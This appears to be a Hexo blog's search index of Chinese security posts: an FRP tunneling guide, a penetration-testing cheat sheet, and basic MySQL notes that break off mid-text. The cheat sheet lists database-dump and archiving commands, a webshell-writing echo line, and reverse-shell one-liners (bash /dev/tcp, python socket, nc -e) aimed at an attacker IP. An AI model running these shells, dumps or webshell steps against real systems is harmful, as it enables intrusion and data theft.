<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>frp内网穿透</title>
      <link href="2020/10/13/frp-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
      <url>2020/10/13/frp-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/fatedier/frp">FRP</a> 全名：Fast Reverse Proxy。FRP 是一个使用 Go 语言开发的高性能的反向代理应用，可以轻松地进行内网穿透，对外网提供服务。FRP 支持 TCP、UDP、HTTP、HTTPS等协议类型，并且支持 Web 服务根据域名进行路由转发。  </p><p>frp有客户端和服务端，服务端放在有公网IP的机器上，客户端放在没有公网IP的内网机上。客户端和服务端都需要进行配置，frp给客户端和服务端都默认提供了两种配置文件，完整版：<a href="https://github.com/fatedier/frp/blob/master/conf/frps_full.ini">服务端</a> <a href="https://github.com/fatedier/frp/blob/master/conf/frpc_full.ini">客户端</a>  </p><h3 id="服务端简版："><a href="#服务端简版：" class="headerlink" title="服务端简版："></a>服务端简版：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查看配置，默认配置中监听的是 7000 端口，可根据自己实际情况修改。</span><br><span class="line">$ cat frps.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 启动 FRP 服务端</span><br><span class="line">$ .&#x2F;frps -c .&#x2F;frps.ini</span><br></pre></td></tr></table></figure><p>通过上面简单的两步就可以成功启动一个监听在 7000 端口的 FRP 服务端。</p><h3 id="客户端简版："><a href="#客户端简版：" class="headerlink" title="客户端简版："></a>客户端简版：</h3><p>假设公网ip为4.3.2.1</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 根据需求修改配置</span><br><span class="line">$ vim frpc.ini</span><br><span class="line"></span><br><span class="line">[common]</span><br><span class="line"># server_addr 为 FRP 服务端的公网 IP</span><br><span class="line">server_addr &#x3D; 4.3.2.1</span><br><span class="line"># server_port 为 FRP 服务端监听的端口</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 启动 FRP 客户端</span><br><span class="line">$ .&#x2F;frpc -c .&#x2F;frpc.ini</span><br></pre></td></tr></table></figure><ul><li>访问内网ssh </li></ul><p>服务端配置frps.ini：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure><p>客户端配置frpc.ini【(假设公网ip(即服务端ip)为192.168.254.1】:  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr &#x3D; 192.168.254.1</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line"></span><br><span class="line">[ssh]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">local_ip &#x3D; 127.0.0.1</span><br><span class="line">local_port &#x3D; 22</span><br><span class="line">remote_port &#x3D; 6000</span><br></pre></td></tr></table></figure><p>然后服务端配置好之后在cmd（windows环境下）中输入：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">frps.exe</span><br></pre></td></tr></table></figure><p>客户端配置好之后（linux环境下）输入：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;frpc -c .&#x2F;frpc.ini</span><br></pre></td></tr></table></figure><p>在第三台电脑中输入<code>ssh -oPort=6000 kali@192.168.254.1</code>即可  </p><ul><li>frp代理内网 </li></ul><p>FRP 客户端内置了 http_proxy 和 socks5 插件，通过这两个插件都可以实现内网代理，这里以socks5为例<br>服务端配置frps.ini：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port &#x3D; 7000</span><br></pre></td></tr></table></figure><p>客户端配置frpc.ini:  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># 远程VPS地址</span><br><span class="line">server_addr &#x3D; 4.3.2.1</span><br><span class="line">server_port &#x3D; 7000</span><br><span class="line">tls_enable &#x3D; true</span><br><span class="line">pool_count &#x3D; 5</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">type &#x3D; tcp</span><br><span class="line">remote_port &#x3D; 46075</span><br><span class="line">plugin &#x3D; socks5</span><br><span class="line"># 设置代码认证（可要可不要）</span><br><span class="line">plugin_user &#x3D; admin</span><br><span class="line">plugin_passwd &#x3D; password</span><br><span class="line">use_encryption &#x3D; true</span><br><span class="line">use_compression &#x3D; true</span><br></pre></td></tr></table></figure><p>客户端和服务端都配置好之后运行frp，攻击机(第三台电脑)使用Proxifier进行代理设置(IP为vps-ip即4.3.2.1,端口为46075)即可。</p><h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p>[<a href="https://www.anquanke.com/post/id/184855">FRP 内网穿透</a>]</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>备忘录</title>
      <link href="2020/10/13/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
      <url>2020/10/13/%E5%A4%87%E5%BF%98%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h3 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h3><p>mysqldump：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 全部数据库：</span><br><span class="line">mysqldump -uroot -proot --all-database &gt; &#x2F;usr&#x2F;bin&#x2F;all.sql</span><br><span class="line"># 指定数据库</span><br><span class="line">mysqldump -uroot -proot --database db1 db2 &gt; &#x2F;usr&#x2F;bin&#x2F;all.sql</span><br><span class="line"># 指定数据库指定表</span><br><span class="line">mysqldump -uroot -proot --database db1 --tables t1 t2 &gt;&#x2F;usr&#x2F;bin&#x2F;all.sql</span><br><span class="line"># 指定条件</span><br><span class="line">mysqldump -uroot -proot --databases db1 --tables a1 --where&#x3D;&#39;id&#x3D;1&#39;  &gt;&#x2F;tmp&#x2F;a1.sql</span><br></pre></td></tr></table></figure><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><p>linux:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># .tar</span><br><span class="line">    解包：tar xvf FileName.tar</span><br><span class="line">    打包：tar cvf FileName.tar DirName</span><br><span class="line"># .zip</span><br><span class="line">　　解压：unzip FileName.zip</span><br><span class="line">　　压缩：zip FileName.zip DirName</span><br><span class="line">　　压缩：zip -s 100m -r -q -P password file.zip *.sql</span><br><span class="line">　　压缩一个目录使用 -r 参数，-r 递归。例： $ zip -r FileName.zip DirName</span><br><span class="line"># .gz</span><br><span class="line">　　解压1：gunzip FileName.gz</span><br><span class="line">　　解压2：gzip -d FileName.gz</span><br><span class="line">　　压缩：gzip FileName</span><br><span class="line"># .tar.gz和tgz</span><br><span class="line">　　解压：tar zxvf FileName.tar.gz</span><br><span class="line">　　压缩：tar zcvf FileName.tar.gz DirName</span><br><span class="line"># .bz2</span><br><span class="line">　　解压1：bzip2 -d FileName.bz2</span><br><span class="line">　　解压2：bunzip2 FileName.bz2</span><br><span class="line">　　压缩： bzip2 -z FileName</span><br><span class="line"># .tar.bz2</span><br><span class="line">　　解压：tar jxvf FileName.tar.bz2 或tar –bzip xvf FileName.tar.bz2</span><br><span class="line">　　压缩：tar jcvf FileName.tar.bz2 DirName</span><br><span class="line"># .Z</span><br><span class="line">　　解压：uncompress FileName.Z</span><br><span class="line">　　压缩：compress FileName</span><br><span class="line"># .tar.Z</span><br><span class="line">　　解压：tar Zxvf FileName.tar.Z</span><br><span class="line">　　压缩：tar Zcvf FileName.tar.Z DirName</span><br><span class="line"># .rar</span><br><span class="line">　　解压：rar x FileName.rar</span><br><span class="line">　　压缩：rar a FileName.rar DirName</span><br></pre></td></tr></table></figure><p>windows：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rar.exe a -r -v500m -X*.rar -X*.zip sst.rar D:\wwwroot\sq\</span><br></pre></td></tr></table></figure><p>php：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function addFileToZip($path,$zip)&#123;</span><br><span class="line">    $handler&#x3D;opendir($path); &#x2F;&#x2F;打开当前文件夹由$path指定。</span><br><span class="line">    while(($filename&#x3D;readdir($handler))!&#x3D;&#x3D;false)&#123;</span><br><span class="line">        if($filename !&#x3D; &quot;.&quot; &amp;&amp; $filename !&#x3D; &quot;..&quot;)&#123;&#x2F;&#x2F;文件夹文件名字为&#39;.&#39;和‘..’，不要对他们进行操作</span><br><span class="line">            if(is_dir($path.&quot;&#x2F;&quot;.$filename))&#123;&#x2F;&#x2F; 如果读取的某个对象是文件夹，则递归</span><br><span class="line">                addFileToZip($path.&quot;&#x2F;&quot;.$filename, $zip);</span><br><span class="line">            &#125;else&#123; &#x2F;&#x2F;将文件加入zip对象</span><br><span class="line">                $zip-&gt;addFile($path.&quot;&#x2F;&quot;.$filename);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @closedir($path);</span><br><span class="line">&#125;</span><br><span class="line">$zip&#x3D;new ZipArchive();</span><br><span class="line"></span><br><span class="line">if($zip-&gt;open(&#39;&#x2F;tmp&#x2F;backup.zip&#39;, ZipArchive::OVERWRITE)&#x3D;&#x3D;&#x3D; TRUE)&#123;</span><br><span class="line">    addFileToZip(&#39;&#x2F;www&#x2F;wwwroot&#x2F;&#39;, $zip); &#x2F;&#x2F;调用方法，对要打包的根目录进行操作，并将ZipArchive的对象传递给方法</span><br><span class="line">    $zip-&gt;close(); &#x2F;&#x2F;关闭处理的zip文件</span><br><span class="line">    echo 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="linux通过echo写shell："><a href="#linux通过echo写shell：" class="headerlink" title="linux通过echo写shell："></a>linux通过echo写shell：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&quot; | base64 -d &gt; &#x2F;var&#x2F;www&#x2F;sehll.php</span><br></pre></td></tr></table></figure><h3 id="find命令："><a href="#find命令：" class="headerlink" title="find命令："></a>find命令：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -amin -10 # 查找在系统中最后10分钟访问的文件</span><br><span class="line">find &#x2F; -atime -2 # 查找在系统中最后48小时访问的文件</span><br><span class="line">find &#x2F; -empty # 查找在系统中为空的文件或者文件夹</span><br><span class="line">find &#x2F; -group cat # 查找在系统中属于 groupcat的文件</span><br><span class="line">find &#x2F; -mmin -5 # 查找在系统中最后5分钟里修改过的文件</span><br><span class="line">find &#x2F; -mtime -1 #查找在系统中最后24小时里修改过的文件</span><br><span class="line">find &#x2F; -nouser #查找在系统中属于作废用户的文件</span><br><span class="line">find &#x2F; -user fred #查找在系统中属于FRED这个用户的文件</span><br><span class="line">　　</span><br><span class="line"># 查找所有httpd.conf</span><br><span class="line">find &#x2F; -name httpd.conf</span><br><span class="line"># 查找所有.php文件</span><br><span class="line">find &#x2F; -name *.php</span><br></pre></td></tr></table></figure><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>nc监听</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure><p>bash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&quot;&lt;tagetIP&gt;&#x2F;4444 0&gt;&amp;1</span><br><span class="line">exec 5&lt;&gt;&#x2F;dev&#x2F;tcp&#x2F;&quot;&lt;tagetIP&gt;&#x2F;4444;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&lt;tagetIP&gt;&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure><p>nc</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 目标存在nc且拥有-e参数</span><br><span class="line">nc &lt;tagetIP&gt; 4444 -t -e &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySql数据库基础</title>
      <link href="2020/09/23/MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"/>
      <url>2020/09/23/MySql%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="MySql数据库基础"><a href="#MySql数据库基础" class="headerlink" title="MySql数据库基础"></a>MySql数据库基础</h1><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>MySql的应用还没有很系统的总结过，就花时间重新总结了一下，内容可能也不是太全面，如有不对的地方，还请各位师傅纠正。</p><h3 id="0x01-SQL基础"><a href="#0x01-SQL基础" class="headerlink" title="0x01 SQL基础"></a>0x01 SQL基础</h3><h4 id="基本定义"><a href="#基本定义" class="headerlink" title="基本定义"></a>基本定义</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据:是数据库总存储的基本对象</span><br><span class="line">定义:描述客观事物的符号记录</span><br><span class="line">种类:数字、文字、图形、图像、声音等</span><br><span class="line">数据库：DB 存储数据的集合</span><br><span class="line">数据库管理系统：DBMS</span><br><span class="line">用户和操作系统之间的一层数据管理软件</span><br><span class="line">科学地组织和存储数据、高效地获取和维护数据</span><br><span class="line">数据库系统：DBS</span><br><span class="line">计算机系统中引入数据库后的系统</span><br><span class="line">数据库管理员：DBA</span><br><span class="line"></span><br><span class="line">SQL：数据库查询语言</span><br><span class="line">DDL：数据定义语言</span><br><span class="line">DQL：数据查询语言</span><br><span class="line">DML：数据操作语言</span><br><span class="line">DCL：数据控制语言</span><br><span class="line">TPL：事物处理语言</span><br><span class="line">CCL：指针控制语言</span><br><span class="line"></span><br><span class="line">数据库包括</span><br><span class="line">16张表</span><br><span class="line">7个视图</span><br><span class="line">3个存储过程</span><br><span class="line">3个数据库函数</span><br></pre></td></tr></table></figure><h4 id="文件定义"><a href="#文件定义" class="headerlink" title="文件定义"></a>文件定义</h4><p>建库建表后，在data目录下产生了对应文件，不同文件类型的作用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.frm 是描述表结构的文件 可以直接打开</span><br><span class="line">.MYD 是表达数据文件</span><br><span class="line">.MYI 是表数据文件中任何索引的数据树</span><br><span class="line">.opt 记录字符集和字符序</span><br><span class="line">.IBD 是MySQL数据文件、索引文件 也叫独立表空间</span><br><span class="line">无法直接读取</span><br><span class="line">ibdata1 共享表空间</span><br><span class="line">undo 存储表空间</span><br><span class="line">.IDB 智能数据库系统 是一个对象数据库管理系统。</span><br><span class="line">.PAR 交换文件，主要是Windows环境下的文件名</span><br></pre></td></tr></table></figure><h4 id="文本格式区别"><a href="#文本格式区别" class="headerlink" title="文本格式区别"></a>文本格式区别</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">格式区别：</span><br><span class="line">char 是一种固定长度的类型，适合用在身份证号码、手机号码等定常的格式</span><br><span class="line">varchar 是一种可变长度的类型，适合用在长度可变的属性</span><br><span class="line">text 不设置长度，当不知道属性的最大长度时，适合用text</span><br><span class="line">查询速度：char牺牲了空间效率换取了时间效率。</span><br><span class="line">char 最快  存入的空格需要使用 trim()去除空格</span><br><span class="line">varchar 次之</span><br><span class="line">text 最慢</span><br></pre></td></tr></table></figure><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 多行注释 *&#x2F;</span><br><span class="line"># 单行注释</span><br><span class="line">-- 单行注释(注意：两个但横线后面必须加空格)</span><br></pre></td></tr></table></figure><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>整形</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">​tinyint、smallint、mediumint、int、bigint</span><br><span class="line">​小整数值   大整数值   大整数值  大整数值  极大整数值</span><br></pre></td></tr></table></figure><p>浮点型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">​float、double</span><br></pre></td></tr></table></figure><p>小数型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">​decimal (常用：保证数据不丢失)</span><br><span class="line">​如：100.32-----》decimal(5,2)</span><br></pre></td></tr></table></figure><p>字符型</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.char</span><br><span class="line">2.varchar</span><br><span class="line">3.text</span><br><span class="line">4.blob</span><br><span class="line">5.enum 枚举 （多选一）</span><br><span class="line">6.set （多选多）</span><br></pre></td></tr></table></figure><p>日期和时间</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.year </span><br><span class="line">2.date</span><br><span class="line">3.time</span><br><span class="line">4.datetime(5.5没有)</span><br><span class="line">5.timestamp 时间戳</span><br></pre></td></tr></table></figure><p>空和非空</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">空值 null 做为赋值可以用 &#x3D;  作为条件用is null进行判断</span><br><span class="line">非空 is not null 判断非空条件</span><br></pre></td></tr></table></figure><h4 id="基本语法-amp-amp-操作语句"><a href="#基本语法-amp-amp-操作语句" class="headerlink" title="基本语法&amp;&amp;操作语句"></a>基本语法&amp;&amp;操作语句</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create(创建)</span><br><span class="line">alter(更新)</span><br><span class="line">drop(删除)</span><br></pre></td></tr></table></figure><p>一次性删除一个表中所有的数据 包括日志</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">truncate table 表名;</span><br></pre></td></tr></table></figure><p>选中或者使用该数据库 说明接下来的操作都是针对该数据库进行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use 数据库名称</span><br></pre></td></tr></table></figure><p>创建</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建数据库TestDB</span><br><span class="line">create database 数据库名;</span><br><span class="line"></span><br><span class="line"># 创建数据表</span><br><span class="line">create table 数据表名(</span><br><span class="line">字段名 数据类型(长度) [其他值]，</span><br><span class="line">    字段名 数据类型(长度) [其他值]，</span><br><span class="line">    字段名 数据类型(长度) [其他值]，……</span><br><span class="line">);</span><br><span class="line">&#x2F;*</span><br><span class="line">create table 表名(</span><br><span class="line">字段名 类型 (长度) [是否为空] [有无默认值] [是否零填充] [是否无符号][约束设定]......</span><br><span class="line">);</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure><p>更改</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在表中修改字段</span><br><span class="line">ALTER TABLE 表名 MODIFY 字段名 VARCHAR(64) not null;</span><br><span class="line"># 修改表名</span><br><span class="line">rename table 表名 to 新表名;</span><br><span class="line">alter table 表名 rename 新表名;</span><br><span class="line"></span><br><span class="line"># 修改列名</span><br><span class="line">alter table 表名 change 字段名 新字段名;</span><br><span class="line"></span><br><span class="line">#更改表中数据</span><br><span class="line">update 表名 set 字段&#x3D;值[,字段2&#x3D;值2，……] where 条件表达式</span><br></pre></td></tr></table></figure><p>删除</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 删除数据库</span><br><span class="line">drop database 数据库名;</span><br><span class="line"></span><br><span class="line"># 删除数据表</span><br><span class="line">drop table 数据表名</span><br><span class="line"></span><br><span class="line"># 数据删除语句</span><br><span class="line">delete from 表名 [where 条件表达式];</span><br><span class="line"></span><br><span class="line"># 删除一个表中的所有数据 重置为初始状态</span><br><span class="line"># truncate ：不会对日志进行操作</span><br><span class="line">truncate table 数据表名;</span><br><span class="line"></span><br><span class="line"># 删除表中字段</span><br><span class="line">ALTER TABLE 表名 DROP 字段名;</span><br></pre></td></tr></table></figure><p>添加</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在表中添加字段</span><br><span class="line">ALTER TABLE 表名 ADD 字段名 字段数值参数;</span><br><span class="line"># 注意：向已经有数据的表中增加字段，建议该字段允许为空或设定默认值</span><br><span class="line"></span><br><span class="line"># 插入数据</span><br><span class="line">insert into 表名(字段列表) values (值列表);</span><br><span class="line"># 字段列表与值列表必须一一匹配（个数相同，顺序一致，类型兼容）</span><br><span class="line"># insert into 表名 values (),() 添加多条数据</span><br><span class="line"># 添加自动增长字段时，不添加可用defaul代替</span><br><span class="line"></span><br><span class="line">############添加数据来源于其他的表中############</span><br><span class="line"># 通过子查询添加数据 添加数据来源于其他表中</span><br><span class="line"># 这里不需要values</span><br><span class="line">INSERT into tc (select stu_name from stu_info);</span><br><span class="line"></span><br><span class="line"># 1.待添加数据的表存在的情况下 的语法</span><br><span class="line"> insert into 表名(字段列表) select 字段列表 from 表名 [where 条件表达式];</span><br><span class="line"> </span><br><span class="line"># 2. 待添加数据的表不存在的情况下的语法</span><br><span class="line"> create table 表名[(字段列表)] select 字段列表 from 表名 [where 条件表达式]；</span><br><span class="line"> </span><br><span class="line"># 不添加字段</span><br><span class="line"> create table 表名 select 字段列表 from 表名 [where 条件表达式]</span><br><span class="line"># 注意：平时创建表字段的时候字段名不相同会导致添加数据新建一个字段，需要通过as别名去改变字段的名字添加数据</span><br></pre></td></tr></table></figure><p>查询</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 子句：需要查询什么信息</span><br><span class="line">from 子句：操作的数据源在哪儿</span><br><span class="line"></span><br><span class="line"># 查询数据</span><br><span class="line">select [字段名],[...] from 表名 [where 条件表达式];</span><br><span class="line"></span><br><span class="line"># 查询一个表中所有数据</span><br><span class="line">select * from 表名;</span><br></pre></td></tr></table></figure><h4 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h4><p>排序方式：    升序——asc（默认：从小到大）    降序——desc（由大到小）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 排序语法：</span><br><span class="line">order by 字段1 [asc]|desc[,字段2 [adc]|desc,……]</span><br></pre></td></tr></table></figure><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># limit 和排序结合起来用，取前面的多少条数据</span><br><span class="line"># 在limit后面只有一个数字时，表示在结果集中取前m条数据</span><br><span class="line"># 在limit后面有两个数字时，表示在结果集中取m+1开始取n条数据</span><br><span class="line">limit m[,n]</span><br><span class="line">select * form teachers order by tage desc limit 2;</span><br></pre></td></tr></table></figure><p>分页</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 分页</span><br><span class="line">limit (页码-1)*每页显示信息数，每页显示信息数;</span><br></pre></td></tr></table></figure><h4 id="group-by-分组"><a href="#group-by-分组" class="headerlink" title="group by:分组"></a>group by:分组</h4><p>Group By语句从英文的字面意义上理解就是“根据(by)一定的规则进行分组(Group)”。它的作用是通过一定的规则将一个数据集划分成若干个小的区域，然后针对若干个小区域进行数据处理。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># group by 字段名 having 条件表达式 分组查询</span><br><span class="line">select sName from elogs inner join students on sID &#x3D; sNo group by sNo having count(sid)&gt;&#x3D;2;</span><br><span class="line"></span><br><span class="line"># having 与 where 的不同之处</span><br><span class="line"># 1.执行顺序不同 having是在分组之后执行，where是在分组之前执行</span><br><span class="line"># 2.聚合函数的使用不同 having子句可以直接使用聚合函数，where子句不行</span><br><span class="line"></span><br><span class="line"># select 字段列表 from 表名 [where [条件表达式]] [group by 字段1,[字段2,……] [having 条件表达式]] [order by 字段1,[字段2,……] asc|[desc]][limit m,n];</span><br></pre></td></tr></table></figure><h4 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h4><p>子查询是一种常用计算机语言SELECT-SQL语言中嵌套查询下层的程序模块。当一个查询是另一个查询的条件时，称之为子查询。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 子查询的用法</span><br><span class="line"># 在字段</span><br><span class="line">select (select cName from courses where cNo &#x3D; cID) as &#39;课程名称&#39;, count(elNo) from elogs GROUP BY cID;</span><br><span class="line"></span><br><span class="line"># 在表</span><br><span class="line">select * from courses where exists(</span><br><span class="line">select * from (select sum(cCredit) as sumValue from courses where cNo in (</span><br><span class="line">select cID from elogs where sID &#x3D;&#39;20180001&#39; and elScore &gt;&#x3D;60</span><br><span class="line">)</span><br><span class="line">)as A where sumValue&lt;10) ;</span><br></pre></td></tr></table></figure><h4 id="多表连接查询"><a href="#多表连接查询" class="headerlink" title="多表连接查询"></a>多表连接查询</h4><p>注意：使用连接技术建议将表经行重命名！</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># explain 检索连接是否达标</span><br><span class="line"># 内连接</span><br><span class="line"> # 语法1</span><br><span class="line">from 表1 inner join 表2 on 主键字段&#x3D;外键字段 [where 条件表达式]</span><br><span class="line"> # 语法2</span><br><span class="line"> from 表1,表2 where 主键字段&#x3D;外键字段 [ and 条件表达式]</span><br><span class="line"> # 三个表连接</span><br><span class="line">from 表1 inner join 表2 on 主键字段 &#x3D; 外键字段 inner join 表3 on 主键字段 &#x3D; 外键字段 [where 条件表达式];</span><br><span class="line"> </span><br><span class="line">from 表1,表2,表3 where 主键字段&#x3D;外键字段 and 主键字段 &#x3D; 外键字段 [ and 条件表达式];</span><br><span class="line"># 外连接outer join</span><br><span class="line"> # 左外连接 left outer join&#x2F;left join</span><br><span class="line"> # 右连接 right outer join&#x2F;right join</span><br></pre></td></tr></table></figure><h4 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">max()最大值</span><br><span class="line">min()最小值</span><br><span class="line">avg()平均值</span><br><span class="line">sum()求和</span><br><span class="line">count()符合条件数据的数目</span><br><span class="line"># 聚合函数不能嵌套使用</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在统计时字段内没有满足条件的数值只有count返回数值0或者其他，而其余四个聚合函数返回null;</span><br><span class="line"># 对于聚合函数的参数，很多时候使用字段名来表示，那么这个时候，该字段内的null值不参与统计</span><br><span class="line">count(*)</span><br></pre></td></tr></table></figure><p>显示表中符合条件的信息数目，不考虑某字段出现null值</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select count(cID),avg(elScore) from elogs;</span><br><span class="line">select count(elNo),avg(elScore) from elogs;</span><br><span class="line">select count(1),avg(elScore) from elogs;</span><br><span class="line">select count(*),avg(elScore) from elogs;</span><br></pre></td></tr></table></figure><h4 id="转换编码"><a href="#转换编码" class="headerlink" title="转换编码"></a>转换编码</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 中文排序想要通过拼英排序的话需要转换编码</span><br><span class="line">convert (tName using gbk)</span><br></pre></td></tr></table></figure><h4 id="去重复值"><a href="#去重复值" class="headerlink" title="去重复值"></a>去重复值</h4> <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># distinct 后面如果有多个字段，则是针对这些字段值组合后的去重</span><br><span class="line"> select distinct sID from Elogs;</span><br><span class="line"># 先去重，再统计</span><br><span class="line">select count(distinct cID) from Elogs;</span><br><span class="line"># &#x3D;号只有确定了一个值才能用  多条值用in</span><br></pre></td></tr></table></figure><h4 id="合并结果集"><a href="#合并结果集" class="headerlink" title="合并结果集"></a>合并结果集</h4><p>对合并后的结果集中的重复数据也会自动去重</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sName from students</span><br><span class="line">union</span><br><span class="line">select tName from Teachers;</span><br></pre></td></tr></table></figure><p>如果不想去重 则使用 union all</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select sName from students</span><br><span class="line">union all</span><br><span class="line">select tName from Teachers;</span><br></pre></td></tr></table></figure><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h4><p>比较运算符：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;大于</span><br><span class="line">&lt;小于</span><br><span class="line">&gt;&#x3D;大于等于</span><br><span class="line">&lt;&#x3D;小于等于</span><br><span class="line">&#x3D; 等于</span><br><span class="line">!&#x3D;不等于</span><br></pre></td></tr></table></figure><p>范围运算符：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">between...and...(包含边界值) 类似于 &gt;&#x3D; and &lt;&#x3D;</span><br><span class="line">not between...and...(不包含边界值，表示不在指定范围内)</span><br></pre></td></tr></table></figure><p>集合运算符</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">in(满足集合中任意一个值，即满足条件，就是多个or表达式)类似于 &#x3D; or &#x3D;</span><br><span class="line">not in(取值不在这个集合中)</span><br><span class="line"></span><br><span class="line">外部大于内部，建议使用in</span><br><span class="line">内部大于外部，建议使用exists</span><br><span class="line">exists 判断是否存在</span><br><span class="line">如果内部查询有数据，则外部执行：否则外部不执行</span><br></pre></td></tr></table></figure><h4 id="函数的应用"><a href="#函数的应用" class="headerlink" title="函数的应用"></a>函数的应用</h4><p>字符串截取</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 从左边开始 第1个字符</span><br><span class="line">left(字段名,1)</span><br><span class="line"># 从那里开始，截取几个</span><br><span class="line">substring(字段名,1,1)</span><br></pre></td></tr></table></figure><p>str函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 连接字符串</span><br><span class="line">concat(s1,s2,s3,……,sn);</span><br><span 